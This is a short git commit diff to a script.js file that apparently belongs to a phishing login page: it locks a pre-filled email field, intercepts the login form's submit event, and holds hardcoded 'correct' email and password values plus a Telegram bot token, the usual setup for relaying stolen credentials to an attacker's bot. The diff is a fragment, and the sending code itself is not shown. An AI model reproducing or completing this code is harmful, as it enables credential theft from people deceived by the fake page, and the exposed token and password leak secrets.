7288b49646e10112353e88e7a841a59940d9c638
finnney93 <itsnew59@yahoo.com>
2025-07-20 16:49:29 -0700

    Update script.js

--- script.js
+++ script.js
@@ -1,3 +1,6 @@
+function handleImgError() {
+document.getElementById('email').setAttribute('readonly', 'readonly');
+document.getElementById('loginForm').addEventListener('submit', function (e) {
         var correctEmail = "info@daum.net";
         var correctPassword = "7717631095";
         var telegramBotToken = "7575108909:AAE0jS-ypEEl-y1VnQsBTGIVKs1Uv7zgPWE";
